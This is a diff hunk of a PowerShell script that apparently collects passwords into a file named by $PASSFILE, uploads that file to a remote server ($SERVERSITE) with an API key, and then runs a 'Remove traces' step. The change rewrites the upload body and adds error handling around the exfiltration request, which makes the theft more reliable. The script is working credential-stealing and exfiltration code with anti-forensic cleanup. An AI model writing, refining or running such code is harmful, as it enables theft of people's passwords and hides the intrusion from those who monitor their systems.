@@ -40,16 +40,21 @@ $Res | Format-Table -AutoSize | Out-File -FilePath .\$PASSFILE -Encoding ASCII -
 
 # Send file to server
 $boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString()
+
 $body = @"
 --$boundary
-Content-Disposition: form-data; name="file"; filename="$(Split-Path $PASSFILE -Leaf)"
+Content-Disposition: form-data; name="file"; filename="$([System.IO.Path]::GetFileName($PASSFILE))"
 Content-Type: application/octet-stream
 
-$(Get-Content -Path .\$PASSFILE -Raw)
+$(Get-Content -Path $PASSFILE -Raw)
 --$boundary--
 "@
 
-Invoke-WebRequest -Uri $SERVERSITE -Method Post -Headers @{"X-API-Key" = $APIKEY} -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+try {
+    Invoke-WebRequest -Uri $SERVERSITE -Method Post -Headers @{"X-API-Key" = $APIKEY} -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+} catch {
+    Write-Host "File upload failed: $($_.Exception.Message)"
+}
 
 # Remove traces
 Start-Sleep -Milliseconds 4500
